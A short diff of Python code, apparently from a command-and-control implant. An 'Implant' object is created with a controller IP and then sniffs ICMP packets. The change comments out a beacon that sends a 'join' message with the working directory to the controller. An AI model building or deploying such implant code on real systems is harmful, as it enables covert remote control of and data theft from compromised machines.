@@ -126,7 +126,7 @@ def main():
     implant = Implant(controller_ip=controller_ip)
 
     # Send join command to the daemon
-    implant.send(implant.controller_ip, "join", os.getcwd().encode())
+    # implant.send(implant.controller_ip, "join", os.getcwd().encode())
 
     # Start sniffing
     sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
